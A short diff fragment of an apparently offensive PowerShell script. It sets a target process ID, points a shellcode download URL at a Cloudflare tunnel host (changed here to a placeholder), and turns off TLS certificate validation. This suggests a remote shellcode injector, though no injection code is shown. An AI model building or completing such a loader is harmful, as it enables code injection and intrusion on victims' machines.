@@ -25,7 +25,7 @@
 $TargetPID = 7584
 
 # Shellcode URL
-$ShellcodeURL = "https://attention-launches-kind-commonly.trycloudflare.com/payloads/shellcode.txt?key=X7k9mP2vL4qR8nT1"
+$ShellcodeURL = "https://CHANGE-MECHANGE-ME.trycloudflare.com/payloads/shellcode.txt?key=X7k9mP2vL4qR8nT1"
 
 # Trust self-signed certificate
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
